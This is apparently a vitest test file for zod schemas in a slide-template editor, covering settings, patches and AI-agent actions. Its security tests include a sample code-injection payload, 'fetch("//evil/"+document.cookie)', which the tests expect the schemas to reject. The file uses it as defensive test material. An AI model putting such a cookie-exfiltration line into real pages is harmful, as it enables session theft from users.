import { describe, it, expect } from 'vitest';
import type { z } from 'zod';
import { zCarouselSettings, zCarouselSettingsPatch, zFreeElement, zTextBoxPatch, zImageBoxPatch } from './carouselSchema';
import { zAgentAction, validateFreeElementPatch } from './agentActions';
import { zTwitterTemplateSettings, zTwitterTemplateSettingsPatch } from './reelsSchema';
import { mergePatch, compactCarouselSettings, compactReelSettings } from './compact';
import { defaultCarouselSettings, defaultTagStyle, defaultTextBox } from '@/app/components/templateEditorTypes';
import type { CarouselSettings } from '@/app/components/templateEditorTypes';
import { defaultTwitterTemplateSettings, resolveTwitterTemplateSettings } from '@/app/components/twitterTemplateTypes';
import type { TwitterTemplateSettings } from '@/app/components/twitterTemplateTypes';

// ── Drift guards ──────────────────────────────────────────────────────────────
// The zod schemas are hand-derived from the TS types. These tests fail the moment
// templateEditorTypes.ts / twitterTemplateTypes.ts gain or change a field that the
// schemas don't know about, so the two can never silently diverge.

// Compile-time: mutual assignability between z.infer<schema> and the TS type.
// (A missing/extra/retyped schema field breaks one of these assignments at tsc time.)
function assertAssignable<T>(v: T): void { void v; }
type InferredCarousel = z.infer<typeof zCarouselSettings>;
type InferredReels = z.infer<typeof zTwitterTemplateSettings>;

describe('schema ↔ type drift guards (compile-time)', () => {
  it('carousel schema type ≡ CarouselSettings', () => {
    assertAssignable<CarouselSettings>(null as unknown as InferredCarousel);
    assertAssignable<InferredCarousel>(null as unknown as CarouselSettings);
  });
  it('reels schema type ≡ TwitterTemplateSettings', () => {
    assertAssignable<TwitterTemplateSettings>(null as unknown as InferredReels);
    assertAssignable<InferredReels>(null as unknown as TwitterTemplateSettings);
  });
});

describe('carousel schema (runtime)', () => {
  it('parses the default settings strictly', () => {
    expect(() => zCarouselSettings.parse(defaultCarouselSettings())).not.toThrow();
  });

  it('parses a realistic populated settings object', () => {
    const s: CarouselSettings = {
      ...defaultCarouselSettings(),
      fontLabel: 'Bebas Neue',
      fontWeight: 400,
      textAlign: 'center',
      tagSlots: [{ text: 'BREAKING', style: defaultTagStyle() }, null, null],
      textBoxes: [{ ...defaultTextBox(), id: 'tb-1', spans: [{ text: 'hi', bold: true, color: '#fff' }] }],
      imageBoxes: [{
        id: 'ib-1', url: 'https://x/y.png', x: 10, y: 20, width: 500, height: 400,
        opacity: 90, cornerRadius: 12, shape: 'circle',
        fade: { enabled: true, top: 0, bottom: 30, left: 0, right: 0, stops: { bottom: [{ loc: 0, opacity: 0, mid: 40 }, { loc: 100, opacity: 100 }] } },
        perspective: { tl: { x: 0, y: 0 }, tr: { x: 5, y: -3 }, br: { x: 0, y: 0 }, bl: { x: 0, y: 0 } },
      }],
      freeElements: [
        { kind: 'tag', id: 'fe-1', x: 0, y: 0, width: 100, height: 40, text: 'NEW', style: defaultTagStyle() },
        { kind: 'custom', id: 'fe-2', x: 0, y: 0, width: 300, height: 200, elementId: 'el1', name: 'Chart', code: 'ctx.fillRect(0,0,1,1);', inputSchema: [{ key: 'series', label: 'Series', dataType: 'series' }], data: [1, 2] },
      ],
      dividerSlots: ['logo-left-fade', null, null],
      dividerSubSlots: [{ type: 'tag', text: 'ALERT', style: defaultTagStyle() }, null, null],
      dividerSettings: [{ lineColor: '#fff', fadeSpread: 40 }, null, null],
      layerOrderIds: ['__fade__', 'tb-1', 'ib-1'],
      headlineSpans: [{ text: 'hello', color: '#ff0000' }],
    };
    expect(() => zCarouselSettings.parse(s)).not.toThrow();
  });

  it('rejects unknown top-level keys (model typos)', () => {
    const res = zCarouselSettingsPatch.safeParse({ fontsize: 60 });
    expect(res.success).toBe(false);
  });

  it('rejects unknown nested keys and bad enums with field paths', () => {
    const bad = zCarouselSettingsPatch.safeParse({ textAlign: 'middle' });
    expect(bad.success).toBe(false);
    const badWeight = zCarouselSettingsPatch.safeParse({ fontWeight: 450 });
    expect(badWeight.success).toBe(false);
    const badNested = zCarouselSettingsPatch.safeParse({ tagStyle: { ...defaultTagStyle(), glow: true } });
    expect(badNested.success).toBe(false);
  });

  it('every default key exists in the schema shape', () => {
    const shapeKeys = new Set(Object.keys(zCarouselSettings.shape));
    for (const key of Object.keys(defaultCarouselSettings())) {
      expect(shapeKeys, `schema is missing "${key}"`).toContain(key);
    }
  });

  it('free-element union branches resolve by kind (verbs rely on this)', () => {
    for (const kind of ['tag', 'quote', 'swipe', 'logo', 'divider', 'custom']) {
      const branch = zFreeElement.options.find(o => o.shape.kind.value === kind);
      expect(branch, `no branch for kind "${kind}"`).toBeTruthy();
    }
  });
});

describe('deep-partial patch schemas (the mainline restyle shapes)', () => {
  it('accepts nested-partial settings patches and null-clears', () => {
    expect(zCarouselSettingsPatch.safeParse({ tagStyle: { bgColor: '#f00' } }).success).toBe(true);
    expect(zCarouselSettingsPatch.safeParse({ headlineShadow: null }).success).toBe(true);
    expect(zCarouselSettingsPatch.safeParse({ headlineShadow: { enabled: true, blur: 24 } }).success).toBe(true);
    expect(zCarouselSettingsPatch.safeParse({ tagStyle: { shadow: { enabled: true } } }).success).toBe(true);
  });

  it('accepts nested-partial item patches', () => {
    expect(zTextBoxPatch.safeParse({ shadow: { enabled: false } }).success).toBe(true);
    expect(zTextBoxPatch.safeParse({ spans: null }).success).toBe(true);
    expect(zImageBoxPatch.safeParse({ fade: { bottom: 40 } }).success).toBe(true);
    expect(zImageBoxPatch.safeParse({ fgEffects: { blur: 10 } }).success).toBe(true);
  });

  it('still rejects unknown keys inside nested patches', () => {
    expect(zCarouselSettingsPatch.safeParse({ tagStyle: { glow: true } }).success).toBe(false);
    expect(zTextBoxPatch.safeParse({ shadow: { spread: 4 } }).success).toBe(false);
  });

  it('validateFreeElementPatch accepts nested style partials per kind', () => {
    expect(validateFreeElementPatch('tag', { style: { textColor: '#fff' } })).toBeNull();
    expect(validateFreeElementPatch('swipe', { style: { arrowColor: '#fff' } })).toBeNull();
    expect(validateFreeElementPatch('logo', { shadow: null })).toBeNull();
    expect(validateFreeElementPatch('tag', { kind: 'quote' })).toMatch(/kind cannot be changed/);
  });
});

describe('custom-element code stays out of the agent surface (security)', () => {
  it('add_free_element rejects kind:"custom"', () => {
    const res = zAgentAction.safeParse({
      type: 'add_free_element', slideId: 's1',
      element: { kind: 'custom', x: 0, y: 0, width: 100, height: 100, elementId: 'e', name: 'x', code: 'while(1){}' },
    });
    expect(res.success).toBe(false);
  });

  it('patch_free_element on a custom element rejects code/data/schema rewrites but allows geometry', () => {
    expect(validateFreeElementPatch('custom', { code: 'evil()' })).toMatch(/only be moved/);
    expect(validateFreeElementPatch('custom', { data: [1] })).toMatch(/only be moved/);
    expect(validateFreeElementPatch('custom', { inputSchema: [] })).toMatch(/only be moved/);
    expect(validateFreeElementPatch('custom', { x: 50, y: 80, width: 300 })).toBeNull();
  });

  it('generate_element accepts the refine flag', () => {
    expect(zAgentAction.safeParse({ type: 'generate_element', prompt: 'a bar chart' }).success).toBe(true);
    expect(zAgentAction.safeParse({ type: 'generate_element', prompt: 'thicker bars', refine: true }).success).toBe(true);
  });

  it('patch_slide CANNOT smuggle custom-element code through settings.freeElements (code-injection guard)', () => {
    const evil = zAgentAction.safeParse({
      type: 'patch_slide', slideId: 's1',
      settings: { freeElements: [{ kind: 'custom', id: 'e', x: 0, y: 0, width: 100, height: 100, elementId: 'z', name: 'y', code: 'fetch("//evil/"+document.cookie)' }] },
    });
    expect(evil.success).toBe(false);   // the 'custom' branch is dropped from the patch union → rejected
  });

  it('patch_slide still accepts AND retains a non-custom free element in settings.freeElements', () => {
    const ok = zAgentAction.safeParse({
      type: 'patch_slide', slideId: 's1',
      settings: { freeElements: [{ kind: 'tag', id: 'e', x: 0, y: 0, width: 100, height: 40, text: 'NEW', style: defaultTagStyle() }] },
    });
    expect(ok.success).toBe(true);
    // Teeth: assert the array survives — success alone passes even with the resilient patch removed.
    if (ok.success && ok.data.type === 'patch_slide') expect(ok.data.settings?.freeElements).toHaveLength(1);
  });
});

describe('reels schema (runtime)', () => {
  it('parses the default settings strictly', () => {
    expect(() => zTwitterTemplateSettings.parse(defaultTwitterTemplateSettings())).not.toThrow();
  });

  it('parses resolved settings with cells and free elements', () => {
    const s = resolveTwitterTemplateSettings({
      cellTop: { type: 'banner', banner: { showAvatar: true, avatarShape: 'circle' } },
      cellBottom: { type: 'text', isCaption: true, textStyle: { fontLabel: 'Inter', fontSize: 40, color: '#fff' } },
      freeElements: [{ id: 'f1', x: 10, y: 20, width: 300, height: 120, type: 'image', imageUrl: 'https://x/y.png', imageStyle: { fit: 'cover', imageScale: 1.2 } }],
      videoBandHeight: 900,
    });
    expect(() => zTwitterTemplateSettings.parse(s)).not.toThrow();
  });

  it('rejects unknown keys and bad cell types', () => {
    expect(zTwitterTemplateSettingsPatch.safeParse({ headerColour: '#fff' }).success).toBe(false);
    expect(zTwitterTemplateSettingsPatch.safeParse({ cellTop: { type: 'bannerCaption' } }).success).toBe(false);
  });

  it('every default key exists in the schema shape', () => {
    const shapeKeys = new Set(Object.keys(zTwitterTemplateSettings.shape));
    for (const key of Object.keys(defaultTwitterTemplateSettings())) {
      expect(shapeKeys, `schema is missing "${key}"`).toContain(key);
    }
  });
});

describe('mergePatch', () => {
  it('deep-merges plain objects, keeping unpatched siblings', () => {
    const base = { tagStyle: { bgColor: '#111', fontSize: 13, textCase: 'none' }, fontSize: 68 };
    const out = mergePatch(base, { tagStyle: { bgColor: '#f00' } });
    expect(out.tagStyle).toEqual({ bgColor: '#f00', fontSize: 13, textCase: 'none' });
    expect(out.fontSize).toBe(68);
    expect(base.tagStyle.bgColor).toBe('#111');   // input not mutated
  });

  it('replaces arrays whole and treats null as an explicit value', () => {
    const base = { tagSlots: [{ text: 'A' }, null, null], headlineSpans: [{ text: 'x' }] as unknown };
    const out = mergePatch(base, { tagSlots: [null, { text: 'B' }, null], headlineSpans: null });
    expect(out.tagSlots).toEqual([null, { text: 'B' }, null]);
    expect(out.headlineSpans).toBeNull();
  });

  it('ignores undefined keys', () => {
    const out = mergePatch({ a: 1, b: 2 }, { a: undefined as unknown as number, b: 3 });
    expect(out).toEqual({ a: 1, b: 3 });
  });
});

describe('compact state', () => {
  it('compact(defaults) is empty', () => {
    expect(compactCarouselSettings(defaultCarouselSettings())).toEqual({});
    expect(compactReelSettings(defaultTwitterTemplateSettings())).toEqual({});
  });

  it('round-trips: mergePatch(defaults, compact(s)) ≡ s', () => {
    const s: CarouselSettings = {
      ...defaultCarouselSettings(),
      fontSize: 72,
      canvasColor: '#101010',
      tagStyle: { ...defaultTagStyle(), bgColor: '#00ff00' },
      textBoxes: [{ ...defaultTextBox(), id: 'tb-9', text: 'Hello' }],
      headlineSpans: [{ text: 'hi' }],
    };
    const compactRep = compactCarouselSettings(s);
    // Only the changed keys travel…
    expect(Object.keys(compactRep).sort()).toEqual(['canvasColor', 'fontSize', 'headlineSpans', 'tagStyle', 'textBoxes']);
    // …and merging them over the defaults reconstructs the full state.
    const rebuilt = mergePatch(
      defaultCarouselSettings() as unknown as Record<string, unknown>,
      compactRep as Record<string, unknown>,
    );
    expect(rebuilt).toEqual(s);
  });
});
